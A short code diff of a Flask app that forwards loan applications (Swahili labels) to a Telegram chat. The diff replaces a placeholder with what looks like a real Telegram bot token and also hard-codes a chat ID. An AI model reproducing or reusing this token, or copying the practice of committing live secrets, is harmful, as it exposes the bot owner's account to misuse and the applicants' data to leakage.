@@ -10,7 +10,7 @@ app = Flask(__name__)
 CORS(app)
 
 # TELEGRAM CONFIG
-BOT_TOKEN = "YOUR_BOT_TOKEN"
+BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
 CHAT_ID = "6958413637"
 
 maombi = {}
@@ -21,7 +21,7 @@ maombi = {}
 def tuma_kwenye_telegram(app_id, data):
 
     ujumbe = f"""
-📥 MAOMBI MAPYA YA MKOPO
+📥 NEW APPLICATION 
 
 🆔 Namba ya Maombi: {app_id}
 
